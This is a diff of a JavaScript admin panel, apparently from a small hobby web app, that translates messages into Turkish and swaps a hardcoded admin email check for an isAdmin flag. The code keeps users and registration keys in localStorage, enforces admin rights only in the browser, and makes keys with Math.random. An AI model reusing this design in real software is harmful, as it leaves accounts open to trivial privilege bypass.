+                if (email === currentUser.email) { showToast('Kendini banlayamazsın.', 'error'); return; }
+                const dur = prompt('Süre (dakika) veya "kalıcı":', 'kalıcı');
                 if (dur === null) return;
                 const duration = dur.toLowerCase().trim();
-                const banDuration = (duration === 'permanent' || isNaN(parseInt(duration))) ? 'permanent' : parseInt(duration);
+                const banDuration = (duration === 'kalıcı' || isNaN(parseInt(duration))) ? 'permanent' : parseInt(duration);
                 window.banUser(email, banDuration);
                 renderAdminPanel();
                 renderBanList();
-                showToast(`${email} banned.`, 'success');
+                showToast(`${email} banlandı.`, 'success');
             });
         });
         ul.querySelectorAll('[data-action="delete"]').forEach(btn => {
             btn.addEventListener('click', function() {
                 const email = this.dataset.email;
-                if (email === currentUser.email) { showToast('Cannot delete yourself.', 'error'); return; }
-                if (!confirm(`Delete ${email}?`)) return;
+                if (email === currentUser.email) { showToast('Kendini silemezsin.', 'error'); return; }
+                if (!confirm(`${email} silinsin mi?`)) return;
                 users = users.filter(u => u.email !== email);
                 saveUsers();
                 renderAdminPanel();
                 updateUI();
-                showToast(`${email} deleted.`, 'success');
+                showToast(`${email} silindi.`, 'success');
             });
         });
     }
 
     if (generateKeyBtn) {
         generateKeyBtn.addEventListener('click', function() {
-            if (session.email !== 'apomuhammed1@gmail.com') { showToast('Access denied.', 'error'); return; }
+            if (!isAdmin) { showToast('Yetkiniz yok.', 'error'); return; }
             const key = Math.random().toString(36).substring(2, 10).toUpperCase();
             registrationKeys.push(key);
             localStorage.setItem('registrationKeys', JSON.stringify(registrationKeys));
             newKeyDisplay.value = key;
-            showToast('New key: ' + key, 'success');
+            showToast('Yeni anahtar: ' + key, 'success');
         });
     }
 
@@ -1760,8 +1526,6 @@
     const sidebar = $('sidebar');
     const sidebarOverlay = $('sidebarOverlay');
     const sidebarClose = $('sidebarClose');
-    const logoutBtn = $('logoutBtn');
-    const themeToggle = $('themeToggle');
 
     function openSidebar() { sidebar.classList.add('open'); sidebarOverlay.classList.add('active'); document.body.style.overflow = 'hidden'; }
     function closeSidebar() { sidebar.classList.remove('open'); sidebarOverlay.classList.remove('active'); document.body.style.overflow = ''; }
@@ -1771,6 +1535,7 @@
     if (sidebarOverlay) sidebarOverlay.addEventListener('click', closeSidebar);
 
     // ---- THEME ----
+    const themeToggle = $('themeToggle');
     if (themeToggle) {
         themeToggle.addEventListener('click', function() {
             const html = document.documentElement;
@@ -1779,18 +1544,19 @@
             html.setAttribute('data-theme', newTheme);
             this.querySelector('i').className = isDark ? 'fas fa-sun' : 'fas fa-moon';
             if (themeSelect) themeSelect.value = newTheme;
-            showToast(isDark ? 'Light theme' : 'Dark theme', 'info');
+            showToast(isDark ? 'Aydınlık tema' : 'Karanlık tema', 'info');
         });
     }
 
     // ---- LOGOUT ----
+    const logoutBtn = $('logoutBtn');
     if (logoutBtn) {
         logoutBtn.addEventListener('click', function() {
             let sessions = JSON.parse(localStorage.getItem('ccSessions')) || [];
             sessions = sessions.filter(s => s.email !== currentUser.email);
             localStorage.setItem('ccSessions', JSON.stringify(sessions));
             localStorage.removeItem('ccSession');
-            showToast('Logged out.', 'info');
+            showToast('Çıkış yapıldı.', 'info');
             setTimeout(() => { window.location.href = 'index.html'; }, 500);
         });
     }
@@ -1801,7 +1567,7 @@
         item.addEventListener('click', function() {
             const tab = this.dataset.tab;
             if (!tab) return;
-            if (tab === 'admin' && session.email !== 'apomuhammed1@gmail.com') { showToast('Admin access required.', 'error'); return; }
+            if (tab === 'admin' && !isAdmin) { showToast('Admin yetkiniz yok.', 'error'); return; }
             switchTab(tab);
         });
     });
@@ -1817,7 +1583,7 @@
     updateSession();
     updateUI();
 
-    if (session.email === 'apomuhammed1@gmail.com') {
+    if (isAdmin) {
         if (adminLock) adminLock.style.display = 'block';
         if (adminContent) adminContent.style.display = 'none';
     }
